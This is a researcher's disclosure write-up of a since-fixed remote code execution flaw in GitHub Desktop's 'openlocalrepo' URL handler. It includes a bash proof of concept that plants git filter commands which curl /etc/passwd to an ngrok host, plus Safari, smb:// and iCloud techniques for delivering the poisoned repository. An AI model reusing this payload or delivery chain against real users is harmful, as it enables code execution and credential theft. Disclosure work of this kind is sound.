# RCE in [GitHub Desktop](https://github.com/desktop/desktop) < 2.9.4

![](github_desktop_openlocalrepo_safari.gif)

- [RCE in GitHub Desktop < 2.9.4](#rce-in-github-desktop-294)
- [Intro](#intro)
- [Summary](#summary)
- [Details (< v2.9.4)](#details--v294)
  - ["openlocalrepo" URL command](#openlocalrepo-url-command)
  - [Crafting a "poisoned" git repository](#crafting-a-poisoned-git-repository)
  - [Achieving code execution](#achieving-code-execution)
  - [Delivering a malicious repository to user device](#delivering-a-malicious-repository-to-user-device)
  - [Attack scenarios](#attack-scenarios)
- [Impact & fix](#impact--fix)

# Intro

It's obvious why `git` was [selected by Google](news/google-commits-to-solving-security-problems-in-open-source-projects-like-git-and-laravel/) for a security audit as a top-priority open-source project git.

`git` is a dumb version tracker used by every software engineer for collaboration.

`git`'s destiny is to make collaboration efficient for developer. Therefore, `git` needs to have different functionalities that allow to invoke local programs for remote communication, like diff and formatting.

On top of this, git is a basic primitive for deploying, scaling and managing source code and releases. Things like git-lfs make git accessible to a more broad scope of potential users.

# Summary

`openlocalrepo` [URI command](https://github.com/desktop/desktop/blob/18238077aa1e4851e710cfa66587cd4fd597bacd/app/src/cli/commands/open.ts#L35) in GitHub Desktop < 2.9.4 allows importing a crafted repository with malicious payload in `/.git/config` on the targeted machine leading to code execution.

# Details (< v2.9.4)

## "openlocalrepo" URL command

Unlike `openrepo` URI command, `openlocalrepo` doesn't ask the user for a confirmation to import a repository from local FS.
`github-mac://openlocalrepo/<path_to_local_repo>` command immediately imports the specified local repository into GitHub Desktop app.

## Crafting a "poisoned" git repository

If repository won't be downloaded via `git clone`, then attacker can supply its own repository configuration in `.git/config`

```bash
mkdir -p /tmp/evil
cd /tmp/evil
git init
cat > ./.git/config<<- EOM
[filter "any"]
    smudge = curl --data-binary "@/etc/passwd" https://metnew.ngrok.io/smudge
    clean = curl --data-binary "@/etc/passwd" https://metnew.ngrok.io/clean
EOM
touch example
git add ./example
git commit -m 'commit'
echo "*  text  filter=any" > .gitattributes
```

> Make sure to replace the test payload
> To confirm the config is poisoned run `git status` inside the repo

This repo has [git filters](https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes) that GitHub Desktop will execute as soon as the repo is imported.
When Desktop imports the repo it'll run `any` filter for `.gitattributes` file, because this file hasn't been committed yet.

## Achieving code execution

At this point, we know the following things:

- importing a local repo with URL handler doesn't require user confirmation (except for running the URL command in the browser).
- importing a local repo may lead to code execution

That means, **running a URL command can lead to malicious code execution** on user device.

## Delivering a malicious repository to user device

This is a pretty annoying task and it depends on what we already know about the target, specifically:

**Q:** What's the OS/browser/username on the targeted device?

> it's possible to discover OS/browser from User-Agent
> it's possible to discover username by previously opening a `ssh://` link in the browser (if user confirms, a SSH session will be started with the current username).
> There are other esoteric methods like stealing the username by sending an HTML file to the target (and disclosing the full path to attacker using JS later).

**Safari: `"Open 'safe' files"` isn't that safe**

**By default**, Safari has **"Open 'safe' files after downloading"** option enabled.
Thus, running `location.href = "./payload.zip"` makes Safari unzipping the archive to `~/Downloads/evil` **without any user interaction**.

**Delivering malicious files with `smb://`**

If it's macOS or Win, we can drop the folder with `location.href="smb://publicshare"`
In macOS, this requires not more than a single click from the target.

**Esoteric methods: Keybase, Google Drive, etc.**

I described some alternative payload delivery methods (Keybase, GDrive, iCloud, etc) in [this blogpost about `.terminal` files](https://medium.com/@metnew/exploiting-popular-macos-apps-with-a-single-terminal-file-f6c2efdfedaa).

**Delivering the payload w icloud links (macOS 10.15)**

URLs like `icloud-sharing://www.icloud.com/iclouddrive/0sW3_56zbqY0Exxxxxxxxxxxx#evil` on macOS 10.15 automatically download folders from the web to user's local iCloud files.

**Delivery summary**

**Hypothesis**: delivering a malicious folder to the device doesn't require more than 1 click from the target.

> Because `smb://` strategy allows doing this on both macOS and Win in no more than 1 click and **doesn't have any specific requirements** (e.g., OS username, OS settings, etc).

> **NOTE:** I don't have a Win machine. But from what I remember, Win could mount public shares without triggering a dialog at all. This hypothesis requires a confirmation though.

## Attack scenarios

**Safari attack scenario**

![](https://drive.google.com/file/d/1QTEtoT_RyZz3ZtFpND82rD_nyXKHDF8L/view?usp=sharing)

1. User visits the attacker's website
2. The website downloads a malicious archive. The archive with the malicious repo is extracted to `/Users/user/Downloads/archive`
3. The website runs `location.href = 'github-mac://openlocalrepo//Users/user/Downloads/archive'`.
4. pwn.

**smb:// attack scenario**

![](https://drive.google.com/file/d/1QNDr_qzO-KpKMbKEbZ5YW0IhxBHLuJ_e/view?usp=sharing)

> PoC took a bit long, but it's possible to fine tune the smb server to skip that pause I had in the screencast

1. User visits the attacker's website
2. The website opens `location.href = "smb://guest:guest@publicshare"`. (user confirms)
3. The archive with the malicious repo is mounted to `/Volumes/share/evil`
4. The website runs `location.href = 'github-mac://openlocalrepo//Volumes/share/evil'`.
5. pwn.

# Impact & fix

Attacker can run arbitrary code on the targeted device using Github Desktop protocol handler.

As of version 2.9.4, GitHub Desktop asks for a confirmation when opening a local repository :)

See [this PR](https://github.com/desktop/desktop/pull/12935).

**Timeline**

- Aug 29 2021 - initial report
- Sep 9 2021 - the vulnerability is confirmed
- Sep 10 2021 - pull request with [fix](https://github.com/desktop/desktop/pull/12935) is available.
- Sep 10 2021 - GitHub awarded $2K bounty.

**Bounty concerns**

I had a slight feeling the bounty is too small. Because previously similar bugs in GitHub Desktop were awarded with $5K and $10K bounties. GitHub declares they pay bounties only for Critical issues and this one requires conditions to exploit, so I'm kinda ok with this. Maybe I was just too much excited about my finding :)

**Further research**

In the next write-up I'm going to share how I made over $50K+ on some git bugs and features. Stay tuned :)
